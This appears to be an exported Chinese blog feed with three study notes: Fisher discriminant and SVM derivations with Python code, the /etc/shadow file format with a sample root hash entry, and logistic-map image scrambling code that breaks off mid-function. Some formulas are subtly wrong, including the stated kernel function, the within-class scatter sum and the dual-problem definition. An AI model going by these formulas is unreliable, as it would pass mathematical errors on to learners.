\boldsymbol{m}_i=\frac{1}{n_i}\sum\boldsymbol{x}
\]</span> 推导可得 <span class="math display">\[
\begin{align}
\tilde{m}_i&amp;=\frac{1}{n_i}\sum g(\boldsymbol{x})\\
&amp;=g(\boldsymbol{m}_i)
\end{align}
\]</span> 同时 <span class="math display">\[
\begin{align}
\tilde{s}_i^2&amp;=\sum(g(\boldsymbol{x})-\tilde{m}_i)\\
&amp;=\sum\boldsymbol{w}^T(\boldsymbol{x}-\boldsymbol{m}_i)(\boldsymbol{x}-\boldsymbol{m}_i)^T\boldsymbol{w}\\
&amp;=\boldsymbol{w}^T\boldsymbol{S}_i\boldsymbol{w}
\end{align}
\]</span> 那么总的就有 <span class="math display">\[
\begin{align}
\tilde{s}_1^2+\tilde{s}_2^2&amp;=\boldsymbol{w}^T(\boldsymbol{S}_1+\boldsymbol{S}_2)\boldsymbol{w}\\
&amp;=\boldsymbol{w}^T\boldsymbol{S}_w\boldsymbol{w}\\
(\tilde{m}_1-\tilde{m}_2)^2&amp;=\boldsymbol{w}^T(\boldsymbol{m}_1-\boldsymbol{m}_2)(\boldsymbol{m}_1-\boldsymbol{m}_2)^T\boldsymbol{w}\\
&amp;=\boldsymbol{w}^T\boldsymbol{S}_B\boldsymbol{w}
\end{align}
\]</span> 那么准则函数变为 <span class="math display">\[
J(\boldsymbol{w})=\frac{\boldsymbol{w}^T\boldsymbol{S}_B\boldsymbol{w}}{\boldsymbol{w}^T\boldsymbol{S}_W\boldsymbol{w}}
\]</span>
我们知道，我们想要找到的是这个准则函数的最大值，那么此时需要找到该函数的导数为零点。</p>
<p>可以最终计算得到 <span class="math display">\[
J&#39;(\boldsymbol{w})=0\Rightarrow
\boldsymbol{w}=\boldsymbol{S}_W^{-1}(\boldsymbol{m}_1-\boldsymbol{m}_2)
\]</span></p>
<h3 id="示例">示例</h3>
<p>现有某商品评分表如下</p>
<figure>
<img src="/linear-discriminant-function/fisher准则示例图标.png" alt="fisher准则示例图标">
<figcaption aria-hidden="true">fisher准则示例图标</figcaption>
</figure>
<p>现在有评分为 <span class="math inline">\(\boldsymbol{x}^T=(9, 5,
4)\)</span>，判断其是否愿意购买此商品。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sample</span></span><br><span class="line">omega1 = [(<span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>), (<span class="number">7</span>, <span class="number">6</span>, <span class="number">6</span>), (<span class="number">10</span>, <span class="number">7</span>, <span class="number">8</span>), (<span class="number">8</span>, <span class="number">4</span>, <span class="number">5</span>), (<span class="number">9</span>, <span class="number">9</span>, <span class="number">3</span>), (<span class="number">8</span>, <span class="number">6</span>, <span class="number">7</span>), (<span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>)]</span><br><span class="line">omega2 = [(<span class="number">8</span>, <span class="number">4</span>, <span class="number">4</span>), (<span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>), (<span class="number">6</span>, <span class="number">3</span>, <span class="number">3</span>), (<span class="number">6</span>, <span class="number">4</span>, <span class="number">5</span>), (<span class="number">8</span>, <span class="number">2</span>, <span class="number">2</span>)]</span><br><span class="line">omega1 = np.array(omega1)</span><br><span class="line">omega2 = np.array(omega2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get Average</span></span><br><span class="line">m1 = np.average(omega1, axis=<span class="number">0</span>)</span><br><span class="line">m2 = np.average(omega2, axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate S_i</span></span><br><span class="line">A = omega1 - m1</span><br><span class="line">B = omega2 - m2</span><br><span class="line"></span><br><span class="line">S1 = np.dot(A.T, A)</span><br><span class="line">S2 = np.dot(B.T, B)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate S_W</span></span><br><span class="line">S = S1 + S2</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate Weight Vector</span></span><br><span class="line">w = np.dot(np.linalg.inv(S), m1 - m2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate Standard Value</span></span><br><span class="line">b = (np.dot(w, m1) * <span class="built_in">len</span>(omega1) + np.dot(w, m2) * <span class="built_in">len</span>(omega2)) / (<span class="built_in">len</span>(omega1) + <span class="built_in">len</span>(omega2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Feature Vector</span></span><br><span class="line">x = (<span class="number">9</span>, <span class="number">5</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> np.dot(w, x) &gt; b:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;omega 1.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;omega 2.&quot;</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>实际上，判决用的判决边界值是该判别函数的标准截距。</p>
</blockquote>
<h2 id="支持向量机">支持向量机</h2>
<h3 id="支持向量">支持向量</h3>
<p>我们知道将训练样本分开的超平面可能有许多种，但是哪一个超平面是好的判决面呢？</p>
<p><img src="/linear-discriminant-function/分类样本的多种超平面.png" alt="分类样本的多种超平面" style="zoom:50%;"></p>
<p>很自然的我们会选择正中间的超平面，因为它的<strong>容忍性好，鲁棒性高，泛化能力最强</strong>。换句话说，它拥有的<strong>裕量大</strong>。</p>
<p>于是我们定义<strong>最优分类界面</strong>是<strong>给定线性可分样本集，能够将样本分开的最大间隔超平面</strong>。</p>
<p>其中，样本集与分类界面之间的距离 <span class="math inline">\(r\)</span>
定义为<strong>样本与分类界面之间几何间隔的最小值</strong>。</p>
<figure>
<img src="/linear-discriminant-function/支撑向量示意图.png" alt="支撑向量示意图">
<figcaption aria-hidden="true">支撑向量示意图</figcaption>
</figure>
<p>我们把距离最优分类界面最近的这些训练样本称作<strong>支持向量</strong>，那么可以发现最优分类界面完全由支持矢量决定。</p>
<blockquote>
<p>支持向量就像是维持超平面稳定的柱子。</p>
</blockquote>
<p>然而支持向量的寻找比较困难。</p>
<p>我们将其转化，由判决函数 <span class="math display">\[
g(\boldsymbol{x})=\boldsymbol{w}^T\boldsymbol{x}+b
\]</span> 知道解向量可以任意伸缩，同时保持超平面不变，即 <span class="math inline">\(g(\boldsymbol{x})=0\)</span>。</p>
<p>现在缩放 <span class="math inline">\(\boldsymbol{w}\)</span> 和 <span class="math inline">\(b\)</span> 使得对 <span class="math inline">\(\omega_1\)</span> 类的支持向量满足 <span class="math inline">\(g(\boldsymbol{x})=1\)</span> 而对 <span class="math inline">\(\omega_2\)</span> 类的支持向量满足 <span class="math inline">\(g(\boldsymbol{x})=-1\)</span>。</p>
<p>那么可以用方程表示为 <span class="math display">\[
\boldsymbol{w}^T\boldsymbol{x}_i+b\geq +1\\
\boldsymbol{w}^T\boldsymbol{x}_i+b\leq -1
\]</span> 即 <span class="math display">\[
z_kg(\boldsymbol{x}_k)\geq1
\]</span> 模式属于 <span class="math inline">\(\omega_1\)</span> 或是
<span class="math inline">\(\omega_2\)</span> 我们分别令 <span class="math inline">\(z_k=\pm1\)</span>。</p>
<p>由判决面性质可知，距离 <span class="math inline">\(r\)</span> 满足
<span class="math display">\[
r=\frac{g(\boldsymbol{x})}{\|\boldsymbol{w}\|}
\]</span> 定义间隔 <span class="math inline">\(\gamma=\frac{2}{\|\boldsymbol{w}\|}\)</span>，其中可以知道支持向量上满足
<span class="math inline">\(r=\pm1\)</span>。</p>
<figure>
<img src="/linear-discriminant-function/判决函数的支持向量性质.png" alt="判决函数的支持向量性质">
<figcaption aria-hidden="true">判决函数的支持向量性质</figcaption>
</figure>
<p>那么我们更进一步就是想使得间隔 <span class="math inline">\(\gamma\)</span> 最大，不妨定义准则函数 <span class="math display">\[
J(\boldsymbol{w})=\min_a\frac{1}{2}\|\boldsymbol{w}\|^2
\]</span> 同时要满足 <span class="math display">\[
z_kg(\boldsymbol{x})\geq 1
\]</span>
但我们想要找到该准则函数的极小值，由于其带有约束条件，不能使用简单直接的梯度下降法。</p>
<h3 id="不等式约束的极小值">不等式约束的极小值</h3>
<h4 id="朗格朗日定理">朗格朗日定理</h4>
<p><strong>拉格朗日乘数法</strong>指出，要找到 <span class="math inline">\(z=f(x,y)\)</span> 在约束条件 <span class="math inline">\(\varphi(x,y)=0\)</span>
下的极值点，先构造拉格朗日函数 <span class="math display">\[
L(x,y,\lambda)=f(x,y)+\lambda \varphi(x,y)
\]</span> 其中 <span class="math inline">\(\lambda\)</span>
为某一常数。由 <span class="math display">\[
\begin{cases}
f_x(x,y)+\lambda\varphi_x(x,y)=0\\
f_y(x,y)+\lambda\varphi_y(x,y)=0\\
\varphi(x,y)=0
\end{cases}
\]</span> 解出 <span class="math inline">\(x,y,\lambda\)</span>，其中
<span class="math inline">\(x,y\)</span> 就是可能的极值点坐标。</p>
<p>将拉格朗日定理转化为与我们问题相关的形式，问题定义为 <span class="math display">\[
\min f(\boldsymbol{x})\\
\text{s.t. }h_i(\boldsymbol{x})=0,i=1,2,\cdots,l
\]</span> 作出拉格朗日函数 <span class="math display">\[
L(\boldsymbol{x},\boldsymbol{\lambda})=f(\boldsymbol{x})-\sum^{l}_{i=1}\lambda_ih_i(\boldsymbol{x})
\]</span> 其中，<span class="math inline">\(\boldsymbol{\lambda}=(\lambda_1,\lambda_2,\cdots,\lambda_l)^T\)</span>
称作<strong>乘子向量</strong>。</p>
<p>若 <span class="math inline">\(\boldsymbol{x}^*\)</span>
是局部极小值，那么一定存在 <span class="math inline">\(\boldsymbol{\lambda}^*\)</span> 满足 <span class="math display">\[
\nabla_xL(\boldsymbol{x}^*,\boldsymbol{\lambda}^*)=0
\]</span> 即 <span class="math display">\[
\nabla_xf(\boldsymbol{x}^*)-\sum^{l}_{i=1}\lambda^*_i\nabla
h_i(\boldsymbol{x}^*)=0
\]</span></p>
<h4 id="kt-最优性条件">KT 最优性条件</h4>
<p>约束优化的一阶必要条件是由 Kuhn 和 Tuchker 于 1951
年提出，所以一阶必要条件又称为 KT 条件，满足 KT 条件的点又称作 KT
点。</p>
<p>KT 最优性条件是用于求解不等式约束的，问题定义如下 <span class="math display">\[
\min f(\boldsymbol{x})\\
\text{s.t. }h_i(\boldsymbol{x})\geq0,i=1,2,\cdots,l
\]</span> 在拉格朗日定理的基础上，增加约束条件，即为 <span class="math display">\[
\begin{cases}
\nabla_xf(\boldsymbol{x}^*)-\sum^{l}_{i=1}\lambda^*_i\nabla
h_i(\boldsymbol{x}^*)=0\\
h_i(\boldsymbol{x}^*)\geq0,\lambda_i^*\geq0,\lambda^*_ih_i(\boldsymbol{x}^*)=0,i=1,2,\cdots,l
\end{cases}
\]</span> 这样就可以解决带不等式约束的极小值。</p>
<h3 id="对偶问题">对偶问题</h3>
<p>对偶问题是最优化问题的一个重要概念，它与原始问题相对应，通过对偶问题的解，可以推导出原始问题的解或相关信息。</p>
<p>对偶问题的主要思想是：将原问题中的部分约束条件转移到目标函数中，变为目标函数中的惩罚项。从而得到一个新的最优化问题，这就是对偶问题。</p>
<p>比如说一个原始问题是 <span class="math display">\[
\min f(x)\\
\text{s.t. }c(x)=0,h(x)&lt;=0
\]</span> 其中 <span class="math inline">\(f(x)\)</span>
是目标函数，<span class="math inline">\(c(x)=0\)</span>
是等式约束，<span class="math inline">\(h(x)\leq 0\)</span>
是不等式约束。</p>
<p>那么对应的对偶问题是 <span class="math display">\[
\max g(u,v)=uc(x)+vh(x)\\
\text{s.t. }u\geq0,v\geq0
\]</span></p>
<h3 id="支持向量机-1">支持向量机</h3>
<p>依据上面的原理，我们可以得到支持向量机的模型可以转化为 <span class="math display">\[
\begin{cases}
\nabla\frac{1}{2}\|\boldsymbol{w}\|^2-\sum^{l}_{i=1}\lambda_i\nabla(z_kg(x_i)-1)
=0\\
z_kg(x_i)-1\geq 0,\lambda_i\geq 0,\lambda_i g(x_i)=0
\end{cases}
\]</span> 一个两类分类问题有以下点 <span class="math display">\[
\omega_1:(1,1),(1,-1)\\
\omega_2:(-1,1),(-1,-1)
\]</span> 通过以上知识，可以写出代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># Samples</span></span><br><span class="line">omega1 = [(<span class="number">1</span>, <span class="number">1</span>), (<span class="number">1</span>, -<span class="number">1</span>)]</span><br><span class="line">omega2 = [(-<span class="number">1</span>, <span class="number">1</span>), (-<span class="number">1</span>, -<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">samples = omega1 + omega2</span><br><span class="line">sample_number = <span class="built_in">len</span>(omega1) + <span class="built_in">len</span>(omega2)</span><br><span class="line">dimension = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Initial</span></span><br><span class="line">w0 = sympy.symbols(<span class="string">&#x27;w0&#x27;</span>)</span><br><span class="line">w = sympy.symbols(<span class="string">f&#x27;w1:<span class="subst">&#123;dimension+<span class="number">1</span>&#125;</span>&#x27;</span>)</span><br><span class="line">Lambda = sympy.symbols(<span class="string">f&#x27;\lambda_1:<span class="subst">&#123;sample_number+<span class="number">1</span>&#125;</span>&#x27;</span>, nonnegative=<span class="literal">True</span>)</span><br><span class="line">z = [<span class="number">1</span>] * <span class="built_in">len</span>(omega1) + [-<span class="number">1</span>] * <span class="built_in">len</span>(omega2)</span><br><span class="line">L = np.dot(w, w) / <span class="number">2</span></span><br><span class="line"><span class="comment"># Relaxtion Conditions</span></span><br><span class="line">relaxtion_conditions = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(sample_number):</span><br><span class="line">    relaxtion_conditions.append(Lambda[i] * (z[i] * (np.dot(w, samples[i]) + w0) - <span class="number">1</span>))</span><br><span class="line">    L -= relaxtion_conditions[-<span class="number">1</span>]</span><br><span class="line"><span class="comment"># KT Conditions</span></span><br><span class="line">KT_conditions = [sympy.diff(L, w0)]</span><br><span class="line"><span class="keyword">for</span> wi <span class="keyword">in</span> w:</span><br><span class="line">    KT_conditions.append(sympy.diff(L, wi))</span><br><span class="line"><span class="comment"># w0 Conditions</span></span><br><span class="line">basis_conditions = [w0]</span><br><span class="line"><span class="comment"># Total Conditions</span></span><br><span class="line">conditions = KT_conditions + relaxtion_conditions + basis_conditions</span><br><span class="line"></span><br><span class="line"><span class="comment"># Solve</span></span><br><span class="line">result = sympy.solve(conditions)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find all solutions besides 0 solution</span></span><br><span class="line">w_sets = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    w_set = [i[wi] <span class="keyword">for</span> wi <span class="keyword">in</span> w]</span><br><span class="line">    <span class="comment"># Besides 0 solution</span></span><br><span class="line">    <span class="keyword">if</span> w_set.count(<span class="number">0</span>) == <span class="built_in">len</span>(w_set):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    w_sets.add(<span class="built_in">tuple</span>(w_set))</span><br><span class="line"><span class="built_in">print</span>(w_sets)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#123;(1, 0)&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<figure>
<img src="/linear-discriminant-function/支持向量机的解.png" alt="支持向量机的解">
<figcaption aria-hidden="true">支持向量机的解</figcaption>
</figure>
<blockquote>
<p>以下是等价问题的转换。</p>
</blockquote>
<p>由基本的支持向量机公式，我们有拉格朗日函数 <span class="math display">\[
L(\boldsymbol{w},\lambda_i)=\frac{1}{2}\|\boldsymbol{w}\|^2-\sum^{l}_{i=1}\lambda_i\nabla(z_kg(\boldsymbol{x}_i)-1)
\]</span> 令拉格朗日函数偏导为零，代入公式可得 <span class="math display">\[
\max_\boldsymbol{\lambda}
L(\boldsymbol{\lambda})=\sum_{i=1}^l\lambda_i-\frac{1}{2}\sum^l_{k,j=1}\lambda_k\lambda_jz_kz_j\boldsymbol{x}_k^T\boldsymbol{x}_j\\
\text{s.t. }\sum_{i=1}^l\lambda_iz_i=0,\lambda_i\geq 0
\]</span> 即等价于二次规划问题。</p>
<p>比如说我们有二分类问题，样本为 <span class="math display">\[
\omega_1:\boldsymbol{x}_1=(3,3),\boldsymbol{x}_2=(4,3)\\
\omega_2:\boldsymbol{x}_3=(1,1)
\]</span> 解 <span class="math display">\[
\min_\boldsymbol{\lambda}\frac{1}{2}\sum^l_{k,j=1}\lambda_k\lambda_jz_kz_j\boldsymbol{x}_k^T\boldsymbol{x}_j-\sum_{i=1}^l\lambda_i\\
=\frac{1}{2}(18\lambda_1^2+25\lambda_2^2+2\lambda_3^2+42\lambda_1\lambda_2-12\lambda_1\lambda_3-14\lambda_2\lambda_3)-\lambda_1-\lambda_2-\lambda_3\\
\text{s.t. }\lambda_1+\lambda_2-\lambda_3=0,\lambda_i\geq0,i=1,2,3
\]</span> 将约束条件 <span class="math inline">\(\lambda_3=\lambda_1+\lambda_2\)</span>
带回目标函数得到 <span class="math display">\[
s(\lambda_1,\lambda_2)=4\lambda_1^2+\frac{13}{2}\lambda_2^2+10\lambda_1\lambda_2-2\lambda_1-2\lambda_2
\]</span> 求 <span class="math inline">\(\nabla s=0\)</span>，得到 <span class="math inline">\(s(\lambda_1,\lambda_2)\)</span> 在 <span class="math inline">\((\frac{3}{2},-1)\)</span> 上取极值，但不满足 <span class="math inline">\(\lambda_i\geq 0\)</span>
的约束条件，故在边界上找最小值。</p>
<p>当 <span class="math inline">\(\lambda_1=0\)</span> 时，最小值 <span class="math inline">\(s(0,\frac{2}{13})=-\frac{2}{13}\)</span>；</p>
<p>当 <span class="math inline">\(\lambda_2=0\)</span> 时，最小值 <span class="math inline">\(s(\frac{1}{4},0)=-\frac{1}{4}\)</span>。</p>
<p>故取最小值 <span class="math inline">\(\lambda_1=\frac{1}{4},\lambda_2=0,\lambda_3=\frac{1}{4}\)</span>，这样，<span class="math inline">\(\boldsymbol{x}_1,\boldsymbol{x}_3\)</span>
为支持向量。</p>
<p>利用 KT 条件反求得到 <span class="math inline">\(w_1=w_2=\frac{1}{2},b=-2\)</span>，故分离超平面为
<span class="math display">\[
\frac{1}{2}x_1+\frac{1}{2}x_2-2=0
\]</span></p>
<h3 id="核函数">核函数</h3>
<p>对于线性不可分问题，我们需要将样本从原始空间映射到一个更高维的特征空间，使得样本在这个特征空间内线性可分，而映射的特征是基于原本特征的<strong>数学意义上的拓展特征</strong>。</p>
<p>那么我们就可以将原本的特征向量作映射，将支持向量机的模型拓展为 <span class="math display">\[
\max_\boldsymbol{\lambda}
L(\boldsymbol{\lambda})=\sum_{i=1}^l\lambda_i-\frac{1}{2}\sum^l_{k,j=1}\lambda_k\lambda_jz_kz_j\phi(\boldsymbol{x}_k)^T\phi(\boldsymbol{x}_j)\\
\text{s.t. }\sum_{i=1}^l\lambda_iz_i=0,\lambda_i\geq 0
\]</span> 其中，<span class="math inline">\(\phi(\boldsymbol{x})\)</span>
是映射函数，也称核映射，即将 <span class="math inline">\(l\)</span>
维的特征空间映射到更高维的特征空间。</p>
<p>那么分离超平面则为 <span class="math display">\[
f(\boldsymbol{x})=\boldsymbol{w}\phi(\boldsymbol{x})+b
\]</span> <img src="/linear-discriminant-function/核映射的一个示意图.png" alt="核映射的一个示意图"></p>
<p>比如说一个可能的核映射函数是从 <span class="math inline">\(R^2\to
R^3\)</span>，即 <span class="math display">\[
(x_1,x_2)\to(z_1,z_2,z_3)=(x_1^2,\sqrt{2}x_1x_2,x_2^2)
\]</span> <img src="/linear-discriminant-function/一个二维到三维的核映射.png" alt="一个二维到三维的核映射"></p>
<p>但我们知道，如果计算核映射，且计算高纬度的核映射，我们不仅需要设计一个好的核映射，还必须快速的去计算它，这是复杂的。</p>
<p>那么，我们可以发现，在约束中实际上核映射后的结果仅以内积的形式呈现，不妨我们设计一个核函数
<span class="math display">\[
k(\boldsymbol{x}_i,\boldsymbol{x}_j)=\phi(\boldsymbol{x}_i)^T\phi(\boldsymbol{x}_j)
\]</span>
这样我们就可以<strong>不显式地设计核映射，而是设计核函数</strong>。（基本想法）</p>
<p>比如对于上面例子中的核映射，我们可以计算得到其核函数为 <span class="math display">\[
k(\boldsymbol{x}_i,\boldsymbol{x}_j)=(\boldsymbol{x}_i^2+\boldsymbol{x}_j^2)^2
\]</span> <img src="/linear-discriminant-function/核函数的一个设计实例.png" alt="核函数的一个设计实例"></p>
<figure>
<img src="/linear-discriminant-function/常用核函数.png" alt="常用核函数">
<figcaption aria-hidden="true">常用核函数</figcaption>
</figure>
<h3 id="核支持向量机">核支持向量机</h3>
<p>基于核函数的思想，我们可以得到一个新的支持向量机模型，即核支持向量机模型
<span class="math display">\[
\max_\boldsymbol{\lambda}
L(\boldsymbol{\lambda})=\sum_{i=1}^l\lambda_i-\frac{1}{2}\sum^l_{k,j=1}\lambda_k\lambda_jz_kz_jk(\boldsymbol{x}_k,\boldsymbol{x}_j)\\
\text{s.t. }\sum_{i=1}^l\lambda_iz_i=0,\lambda_i\geq 0
\]</span> 例如对于在二位特征平面上线性不可分问题 XOR
问题，我们可以设计一个核函数为 <span class="math display">\[
k(\boldsymbol{x}_i,\boldsymbol{x}_j)=[1+\boldsymbol{x}_i^T\boldsymbol{x}_j]^2
\]</span> 使其在该空间上是线性可分的，一个可以构成这个核函数的核映射为
<span class="math display">\[
\phi(\boldsymbol{x})=(1,\sqrt{2}x_1,\sqrt{2}x_2,\sqrt{2}x_1x_2,x_1^2,x_2^2)
\]</span> XOR 问题中， <span class="math display">\[
\omega_1:\boldsymbol{x}_1=(1,1),\boldsymbol{x}_3=(-1,-1)\\
\omega_2:\boldsymbol{x}_2=(1,-1),\boldsymbol{x}_4=(-1,1)
\]</span> 计算过程忽略，我们可以得到 <span class="math display">\[
L(\boldsymbol{\lambda})=\lambda_1+\lambda_2+\lambda_3+\lambda_4\\-\frac{1}{2}(9\lambda_1^2-2\lambda_1\lambda_2-2\lambda_1\lambda_3+2\lambda_1\lambda_4\\+9\lambda_2^2+2\lambda_2\lambda_3-2\lambda_2\lambda_4\\+9\lambda_3^2-2\lambda_3\lambda_4\\+9\lambda_4^2)
\]</span> 最终得到 <span class="math inline">\(\lambda_1=\lambda_2=\lambda_3=\lambda_4=\frac{1}{8}\)</span>，四个样本均为支持向量。</p>
<p>最终解得最优分离超平面为 <span class="math display">\[
f(\boldsymbol{x})=-x_1x_2=0
\]</span></p>
]]></content>
      <tags>
        <tag>模式识别</tag>
      </tags>
  </entry>
  <entry>
    <title>有关 linux 密码存储方式的分析笔记</title>
    <url>//linux-passwd-note.html</url>
    <content><![CDATA[<h1 id="linux-密码文件简述">Linux 密码文件简述</h1>
<p>众所周知，Linux 有一套用户权限管理系统，但用户名跟密码需要存储在
Linux 内部文件中。</p>
<p>在 Unix 中，用户密码文件是存储在 <code>/etc/passwd</code>
中的。但该文件允许所有用户读取，易导致用户密码泄露，因此 Linux
系统将用户的密码信息从 <code>/etc/passwd</code>
文件中分离出来，单独放到了 <code>/etc/shadow</code> 文件。</p>
<p><code>/etc/shadow</code> 只有 root
用户拥有读权限，其他用户没有任何权限，这样就保证了用户密码的安全性。</p>
<p>Unix 系统的用户密码保存格式也可以参考本文章，只是将
<code>/etc/passwd</code> 中的 <code>x</code> 变更为
<code>/etc/shadow</code> 对应的密码而已。</p>
<p>所以如果<strong>影子文件</strong>(<code>/etc/shadow</code>)
的权限发生了改变，需要注意是否是<strong>恶意攻击</strong>。</p>
<h1 id="etcshadow-格式详解"><code>/etc/shadow</code> 格式详解</h1>
<p><code>/etc/shadow</code> 文件内容示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$6$kcgcu794R0VP3fDL$aYN8XUbtWvZ4QQtT2xVW.N2CgE3YLPdtnprAAtKZUgNdq8itUJEN6NoYQDarLUevcDCWrxMVId8b18ujwST1b0::0:99999:7:::</span><br></pre></td></tr></table></figure>
<p>文件中每一行代表一个用户，采用 <code>:</code>
作分隔符，一共被划分为九个字段：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name:password:last-change:min-age:max-age:warning:inactive:expire:blank</span><br></pre></td></tr></table></figure>
<p>字段含义：</p>
<table>
<colgroup>
<col style="width: 15%">
<col style="width: 84%">
</colgroup>
<thead>
<tr class="header">
<th>字段名</th>
<th>字段含义</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>name</td>
<td>登录名称，必须是有效用户名</td>
</tr>
<tr class="even">
<td>password</td>
<td>已加密密码，分为三个部分用$分隔，第一部分表示用哪种哈希算法；第二部分是用于加密哈希的salt；第三部分是已加密的哈希哈希算法。<br>第一部分：<br>1
表示MD5；5 表示SHA-256；6
表示SHA-512。<br>注意：在密码前，一个感叹号(<code>!</code>)代表该用户被锁定，可以在机器上转到改用户，但无法远程；两个感叹号(<code>!</code>)，表示没有设置密码</td>
</tr>
<tr class="odd">
<td>last-change</td>
<td>最近一次更改密码的日期，以距离1970/1/1的天数表示</td>
</tr>
<tr class="even">
<td>min-age</td>
<td>最小修改时间间隔，即密码更改后多少天内不能再次更改。0表示可以随时更改</td>
</tr>
<tr class="odd">
<td>max-age</td>
<td>密码有效期，必须在期限内修改密码</td>
</tr>
<tr class="even">
<td>warning</td>
<td>警告期，警告用户再过多少天密码将过期。0 表示不提供警告</td>
</tr>
<tr class="odd">
<td>inactive</td>
<td>宽限期，密码过期多少天仍然可以使用</td>
</tr>
<tr class="even">
<td>expire</td>
<td>帐号过期时间，以距离1970/1/1的天数表示。0 或空字符表示永不过期</td>
</tr>
<tr class="odd">
<td>blank</td>
<td>预留字段</td>
</tr>
</tbody>
</table>
<h1 id="更改密码">更改密码</h1>
<p>可以在 <code>root</code> 账户下使用 <code>passwd 用户名</code>
指令交互式更改指定用户名的密码。</p>
<p>示例如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># passwd qsdz</span></span><br><span class="line">Enter new UNIX password:</span><br><span class="line">Retype new UNIX password:</span><br><span class="line">passwd: password updated successfully</span><br></pre></td></tr></table></figure>
<p>其中，输入新密码的时候是<strong>无回显</strong>的</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>logistic混沌映射算法</title>
    <url>//logistic-note.html</url>
    <content><![CDATA[<h1 id="简述">简述</h1>
<p>Logistic
混沌映射算法是一种十分简单的算法，其函数是源于一个人口统计的动力学系统，系统方程形式如下：
<span class="math display">\[
X(k+1)=uX(k)[1-X(k)],\ (k=0,1,\dots,n)
\]</span>
由此可知其是一个非线性方程，当同时也是一个递推序列，当满足下述条件时，Logistic
函数将工作于混沌状态： <span class="math display">\[
\begin{cases}
0&lt;X(0)&lt;1\\
3.5699456\dots&lt;\mu\le4
\end{cases}
\]</span> 此时当确定一个 <span class="math inline">\(X(0)\)</span> 和
<span class="math inline">\(\mu\)</span>
时，我们将得到一个混沌序列。</p>
<h1 id="图像置乱">图像置乱</h1>
<h2 id="序列生成">序列生成</h2>
<ol type="1">
<li>首先我们需求一个 <span class="math inline">\(X_0\)</span> 和一个
<span class="math inline">\(\mu\)</span>，带入方程进行迭代得到一个足够混乱的
<span class="math inline">\(X(0)\)</span>；</li>
<li>以该 <span class="math inline">\(X(0)\)</span> 再往下迭代，得到一个
Logistic 序列。</li>
</ol>
<p>需要注意的是，往往我们会使迭代次数足够大，这样才能得到足够混乱的序列。</p>
<p>再将序列归一化到 <span class="math inline">\((0,255)\)</span>
区间内即可。</p>
<h2 id="置乱">置乱</h2>
<p>存在一个 <span class="math inline">\(M\times N\)</span>
的图像，将其转化为 <span class="math inline">\(M\times N\)</span>
的序列，与生成的 Logistic 序列进行异或，如此便完成了一次置乱。</p>
<p>而因为其是通过异或进行置乱的，所以当我们对该序列再进行一次置乱，便可得到原图。</p>
<h2 id="实现">实现</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logistic</span>(<span class="params">im, x0: <span class="built_in">int</span>, mu: <span class="built_in">int</span>, times: <span class="built_in">int</span> = <span class="number">500</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Logistic图像置乱</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        im - Image.open获取的图像类</span></span><br><span class="line"><span class="string">        x0 - 初始密钥</span></span><br><span class="line"><span class="string">        mu - 初始密钥</span></span><br><span class="line"><span class="string">        times - 混沌系统的迭代次数</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        置乱完毕的Image图像类</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    width, height = im.size</span><br><span class="line">    im = np.array(im, dtype = np.uint8).flatten()</span><br><span class="line">    num = im.size</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        x0 = mu * x0 * (<span class="number">1</span> - x0)</span><br><span class="line">    </span><br><span class="line">    E = np.empty(num, dtype = np.float64)</span><br><span class="line">    E[<span class="number">0</span>] = x0</span><br><span class="line">    <span 